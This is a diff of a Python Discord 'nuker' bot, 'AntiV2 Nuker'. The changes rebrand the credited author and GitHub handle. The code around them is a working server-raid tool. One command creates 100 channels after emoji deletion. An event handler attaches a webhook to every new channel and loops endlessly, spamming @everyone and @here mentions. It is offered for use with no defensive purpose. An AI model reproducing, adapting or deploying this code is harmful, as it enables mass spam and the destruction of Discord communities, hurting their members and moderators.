@@ -95,7 +95,7 @@ async def clear(ctx):
     {r}╔══════════════════╗ {r}╔══════════════════╗
           {F.RESET}Commands             {F.RESET}Creators
 		  
-    {r}  $w {F.RESET}| {r}$nk {F.RESET}| {r}$help  {r}    Chills {F.RESET}| {r}Doopy  
+    {r}  $w {F.RESET}| {r}$nk {F.RESET}| {r}$help  {r}    Chills {F.RESET}| {r}@wnfo  
     {r}╚══════════════════╝ {r}╚══════════════════╝
 
 
@@ -137,14 +137,14 @@ async def nk(ctx):
       print(f'               {F.RESET}[{r}-{F.RESET}] Emoji NOT Deleted')
 	  
   for i in range(100):
-    await ctx.guild.create_text_channel("github com 7uk")
+    await ctx.guild.create_text_channel("github com wnfo")
     print(f'               {F.RESET}[{g}+{F.RESET}] Created Channel')
 
 @antinet.event
 async def on_guild_channel_create(channel):
   web = await channel.create_webhook(name="AntiV2 Nuker")
   while True:
-    await web.send('@everyone @here AntiV2 - github.com/7uk')
-    await channel.send('@everyone @here AntiV2 - github.com/7uk')
+    await web.send('@everyone @here AntiV2 - github.com/wnfo')
+    await channel.send('@everyone @here AntiV2 - github.com/wnfo')
 
 antinet.run(TOKEN)
